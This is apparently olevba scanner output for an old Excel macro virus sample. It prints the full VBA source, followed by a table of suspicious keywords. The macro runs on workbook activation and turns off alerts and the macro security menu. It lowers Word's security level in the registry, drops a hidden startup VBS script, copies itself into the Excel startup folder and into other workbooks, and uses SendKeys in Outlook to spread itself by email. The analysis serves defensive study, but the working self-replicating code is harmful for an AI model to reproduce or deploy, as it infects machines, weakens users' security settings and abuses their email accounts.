olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Feeder
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSExcel.Feeder - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' MarshYello
Private Sub Workbook_activate()
' Get Back By Yello 25/10/00
    On Error Resume Next
        With Application
        .DisplayAlerts = (330 - (325 + 5))
        .Application.ScreenUpdating = (330 - (325 + 5))
        .Application.DisplayStatusBar = (330 - (325 + 5))
    End With
         CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
   
    Open "C:\WINDOWS\Start Menu\Programs\StartUp\GetBack.vbs" For Output As #1
    Print #1, "Do"
    Print #1, "Dim Sorrow, File"
    Print #1, "Set Sorrow = CreateObject(""Scripting.FileSystemObject"")"
    Print #1, "Oldtimer = Timer"
    Print #1, "While(Timer<Oldtimer + 120)"
    Print #1, "Wend"
    Print #1, "On Error Resume Next"
    Print #1, "Set File = Sorrow.CreateTextFile(""c:\windows\desktop\Love Letter.vbs"", True)"
    Print #1, "Loop"
    Close #1
    SetAttr "C:\WINDOWS\Start Menu\Programs\StartUp\GetBack.vbs", 6
    Open "C:\Windows\Back.drv" For Output As #1
    Print #1, VBProject.VBComponents(1).codemodule.Lines(1, 60)
    Close #1
    SetAttr ("C:\Windows\Back.drv"), 6
    Set ActiveWB = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").codemodule
    Set ThisWB = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").codemodule
    CheckExist = Dir(Application.StartupPath & "\Book1.")
    If CheckExist = "" Then
    VBAProject.ThisWorkbook.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
    End If
    If ActiveWB.Lines(3, 1) <> "' MarshYello" Then
        ActiveWB.DeleteLines 1, ActiveWB.CountofLines
        ActiveWB.AddFromFile ("C:\Windows\Back.drv")
        ActiveWorkbook.Save
End If
On Error GoTo GetOut
AppActivate ("Inbox - Microsoft Outlook")
SendKeys "^c", True
SendKeys "{DOWN}", True
SendKeys "^r", True
SendKeys "^v", True
SendKeys "%s", True
GetOut:
End Sub



-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: ./Virus.MSExcel.Feeder - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: ./Virus.MSExcel.Feeder - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: ./Virus.MSExcel.Feeder - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |GetBack.vbs         |Executable file name                         |
|IOC       |Letter.vbs          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

